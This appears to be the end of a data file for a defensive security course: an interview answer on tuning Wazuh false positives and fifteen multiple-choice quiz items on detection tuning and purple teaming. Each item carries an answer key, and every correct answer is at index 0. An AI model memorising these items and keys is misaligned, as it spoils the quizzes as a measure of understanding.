        interviewAnswer: '1) Identify the FP pattern (specific IP, process, user, or timing). 2) Add exclusion filters to the rule (whitelist IPs, exclude known-good processes). 3) Verify the rule still matches true positives. 4) Test with wazuh-logtest. 5) Deploy to test group first. 6) Monitor for 24-48 hours. 7) If FP rate drops without losing TP detection, deploy to production.',
        quiz: [
          { question: 'What is the correct tuning process after identifying false positives?', options: ['Identify pattern -> add exclusion -> test -> deploy -> monitor -> verify', 'Disable the rule immediately', 'Increase alert severity', 'Delete the rule'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Systematic tuning ensures FPs are reduced without losing detection capability.', certTags: ['Detection', 'Tuning'] },
          { question: 'What is the first step after a purple team exercise identifies gaps?', options: ['Create rules to fill the gaps, then re-test', 'Ignore the gaps', 'Disable all alerts', 'Wait for vendor update'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Gap remediation is the core purpose of purple teaming.', certTags: ['Purple Team'] },
          { question: 'How long should you monitor for false positives after deploying a new rule?', options: ['24-48 hours', '1 hour', '1 week', 'No monitoring needed'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '24-48 hours captures daily patterns and identifies common FP triggers.', certTags: ['Detection', 'Tuning'] },
          { question: 'What should you check before deploying a rule to production?', options: ['Test with wazuh-logtest, verify no FPs on test group, confirm severity', 'Deploy immediately', 'Wait for management approval', 'Only check the description'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Pre-deployment validation prevents production FP storms.', certTags: ['Detection'] },
          { question: 'What is the purpose of the Phase 6 checkpoint exercise?', options: ['Validate comprehensive understanding of all Blue Team topics', 'Satisfy compliance', 'Train the AI', 'Complete the course quickly'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The checkpoint ensures all skills are validated through scenario-based questions.', certTags: ['Review'] },
          { question: 'A service account generates 50+ brute force alerts daily. How do you tune?', options: ['Whitelist the service account IP and document the exception', 'Disable the rule', 'Increase threshold to 1000', 'Ignore the alerts'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Known service accounts performing expected actions should be whitelisted with documentation.', certTags: ['Detection', 'Tuning'] },
          { question: 'What should a detection rule include for proper tracking?', options: ['MITRE ATT&CK tags, clear description, severity, and author', 'Only the rule ID', 'Just the detection logic', 'Nothing else needed'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Proper metadata ensures rules are maintainable and trackable.', certTags: ['Detection'] },
          { question: 'What is the difference between deploying to test group vs production?', options: ['Test group validates rules in limited scope before full deployment', 'No difference', 'Test group is faster', 'Production is safer'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Test groups catch FPs before they affect all analysts.', certTags: ['Detection'] },
          { question: 'What does "re-testing" after tuning verify?', options: ['New rules detect previously missed attacks without increasing FPs', 'Rules are faster', 'Rules use less CPU', 'Rules have better descriptions'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Re-testing confirms gap remediation works without degrading quality.', certTags: ['Purple Team', 'Detection'] },
          { question: 'What should the final purple team report include?', options: ['Attacks executed, ATT&CK mapping, detection rates, gaps, and actions', 'Only the attacks', 'Only the gaps', 'Only the IOCs'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Complete reports enable tracking improvements over time.', certTags: ['Purple Team'] },
          { question: 'How do you prioritize which detection gaps to fill first?', options: ['By frequency in real-world attacks and business impact', 'Alphabetical order', 'Randomly', 'By rule complexity'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Prioritize gaps that match the most common attack techniques and highest business risk.', certTags: ['Detection', 'MITRE ATT&CK'] },
          { question: 'What is the goal of Phase 6 overall?', options: ['Build Blue Team capabilities: SIEM, detection, forensics, IR, cloud security', 'Learn only one tool', 'Pass a certification', 'Complete assignments quickly'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Phase 6 builds comprehensive defensive security skills across the full Blue Team spectrum.', certTags: ['Review'] },
          { question: 'What should you do with IOCs discovered during a purple team exercise?', options: ['Add them to threat intel watchlists and detection rules', 'Ignore them', 'Delete them', 'Share on social media'], correctAnswerIndex: 0, difficulty: 'intermediate', exercise: 'Purple team IOCs become part of your detection and monitoring.', certTags: ['Purple Team', 'Threat Intel'] },
          { question: 'What is the benefit of documenting everything during IR and purple teaming?', options: ['Enables learning, prevents repeated mistakes, creates audit trail', 'Wastes time', 'Only for compliance', 'Satisfies management'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Documentation is how organizations learn and improve their security posture.', certTags: ['Incident Response', 'Purple Team'] },
          { question: 'How does a purple team exercise differ from a red team exercise?', options: ['Purple team is collaborative - both teams work together; red team is adversarial', 'Same thing', 'Purple team is faster', 'Red team is more thorough'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Purple teaming is collaborative improvement; red teaming is realistic adversarial testing.', certTags: ['Purple Team'] }
        ]
      }
    ]
  }
];

